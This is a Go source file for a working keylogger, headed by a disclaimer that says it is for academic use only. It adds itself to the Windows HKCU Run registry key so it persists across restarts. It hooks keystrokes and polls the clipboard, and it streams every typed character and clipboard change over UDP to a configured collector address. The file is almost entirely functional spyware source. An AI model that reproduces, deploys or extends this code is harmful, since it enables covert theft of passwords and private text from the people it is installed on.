// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"fmt"
	"github.com/atotto/clipboard"
	hook "github.com/robotn/gohook"
	"golang.org/x/sys/windows/registry"
	"net"
	"os"
	"runtime"
)

const (
	Protocol = "udp"
	Address  = "127.0.0.1:8722"

	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	AppName = "Keylogger"

	OSWindows = "windows"
	OSLinux   = "linux"
	OSDarwin  = "darwin"
)

var conn net.Conn

func init() {
	var err error
	conn, err = net.Dial(Protocol, Address)
	if err != nil {
		return
	}
}

func main() {
	defer conn.Close()
	// Register autostart service.
	setAutostart()
	// Start a goroutine to listen clipboard.
	go listenClipboard()
	// Start a goroutine to listen keyboard.
	go listenKeyboard()
	// Block main process.
	select {}
}

// setAutostart registers autostart service on this device.
func setAutostart() {
	// According to the OS, use different strategy to register autostart.
	switch runtime.GOOS {
	case OSWindows:
		// Edit the registry table to register autostart service on Windows system.
		// Get full path of the current running program.
		filename := os.Args[0]
		// Open the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key to read and edit.
		// Edit HKEY_CURRENT_USER instead of HKEY_LOCAL_MACHINE because it does not need administrator permission.
		key, _ := registry.OpenKey(registry.CURRENT_USER, KeyName, registry.ALL_ACCESS)
		defer key.Close()
		// Check if this program has been written to the registry.
		path, _, _ := key.GetStringValue(AppName)
		if path != filename {
			_ = key.SetStringValue(AppName, filename)
		}
	case OSLinux:
		// TODO: Register autostart on Linux
		// Idea: Edit the /etc/rc.d/rc.local
	case OSDarwin:
		// TODO: Register autostart on Mac OS
	default:
		// Does not support other platforms
	}
}

// listenClipboard listens changes of clipboard and send to the server.
func listenClipboard() {
	var text string
	for {
		// Read from clipboard.
		t, _ := clipboard.ReadAll()
		// If the clipboard is nonempty string or has been changed, send it.
		if t != text && t != "" {
			text = t
			conn.Write([]byte(text))
		}
	}
}

// listenKeyboard listens events of keyboard and send to the server.
func listenKeyboard() {
	evChan := hook.Start()
	defer hook.End()
	for ev := range evChan {
		// hook.Start() listens events including mouse and keyboard actions. Only character keys (letters, numbers,
		// symbols, space, enter, etc.) will call the hook.KeyDown event, others (ctrl, alt, f1, etc.) will not. Thus,
		// if detected characters typed, send.
		if ev.Kind == hook.KeyDown {
			conn.Write([]byte(fmt.Sprintf("%c", ev.Keychar)))
		}
	}
}
